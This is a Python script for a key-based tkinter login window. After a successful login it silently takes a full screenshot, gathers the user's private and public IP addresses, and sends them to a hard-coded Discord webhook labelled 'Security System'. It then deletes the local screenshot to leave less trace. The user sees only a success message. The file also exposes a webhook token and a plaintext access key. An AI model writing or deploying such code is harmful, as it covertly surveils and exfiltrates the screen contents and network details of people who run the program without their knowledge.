import requests
from discord_webhook import DiscordWebhook, DiscordEmbed
import os
import mss
import uuid
import socket
import tkinter as tk
from tkinter import messagebox
from datetime import datetime
import threading
import time
import tempfile

WEBHOOK_URL = 'https://discord.com/api/webhooks/1237575444711211048/oyqKIrBeOD3s-A4ecRLpMa3r3w6f5D8Nup1JnsyCL_M1G8n5V1S1mX9fqkw7Jck8Lt25'
VALID_KEY = '1day_weny237h27hndwnmu'

def get_hardware_id():
    return str(uuid.uuid4())

def get_private_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def get_public_ip_address():
    try:
        response = requests.get('https://api.ipify.org')
        IP = response.text
    except Exception:
        IP = 'Unable to get public IP'
    return IP

def take_screenshot():
    with mss.mss() as sct:
        temp_dir = tempfile.gettempdir()
        filename = f'screenshot-{uuid.uuid4()}.png'
        filepath = os.path.join(temp_dir, filename)
        sct.shot(output=filepath)
    return filepath

def send_to_discord(time, hwid, ip_pv, ip_pub, screenshot_path):
    webhook = DiscordWebhook(url=WEBHOOK_URL)
    embed = DiscordEmbed(title='Login Detected', color='03b2f8')
    embed.set_author(name='Security System', icon_url='https://cdn.freebiesupply.com/logos/large/2x/terminal-logo-black-and-white.png')
    embed.add_embed_field(name='Time', value=time, inline=False)
    embed.add_embed_field(name='HWID', value=hwid, inline=False)
    embed.add_embed_field(name='IP Address Private', value=ip_pv, inline=False)
    embed.add_embed_field(name='IP Address Public', value=ip_pub, inline=False)
    embed.set_footer(text='Login System Notification', icon_url='https://cdn.freebiesupply.com/logos/large/2x/terminal-logo-black-and-white.png')
    embed.set_timestamp()
    
    filename_only = os.path.basename(screenshot_path)
    with open(screenshot_path, "rb") as f:
        webhook.add_file(file=f.read(), filename=filename_only)
    embed.set_image(url=f'attachment://{filename_only}')
    
    webhook.add_embed(embed)
    response = webhook.execute()
    
    if response.status_code == 200:
        delete_file_after_delay(screenshot_path, 15)

def delete_file_after_delay(file_path, delay):
    def delay_delete():
        time.sleep(delay)
        os.remove(file_path)
        print(f"File {file_path} has been deleted.")
    
    threading.Thread(target=delay_delete).start()

def login_system_gui():
    def attempt_login():
        key_input = entry_key.get()
        if key_input == VALID_KEY:
            messagebox.showinfo("Login", "Login successful!")
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            hwid = get_hardware_id()
            ip_pv = get_private_ip_address()
            ip_pub = get_public_ip_address()
            screenshot_path = take_screenshot()
            send_to_discord(current_time, hwid, ip_pv, ip_pub, screenshot_path)
            root.destroy()
        else:
            messagebox.showerror("Login", "Invalid key.")

    root = tk.Tk()
    root.title("Login System")
    root.configure(bg='#333')
    root.geometry('400x200')

    tk.Label(root, text="Enter your key:", bg='#333', fg='white', font=('Arial', 14)).pack(pady=(20, 10))
    entry_key = tk.Entry(root, font=('Arial', 14), width=30)
    entry_key.pack(pady=10)
    tk.Button(root, text="Login", command=attempt_login, font=('Arial', 14), bg='#007bff', fg='white', width=15).pack(pady=(10, 20))

    root.mainloop()

if __name__ == "__main__":
    login_system_gui()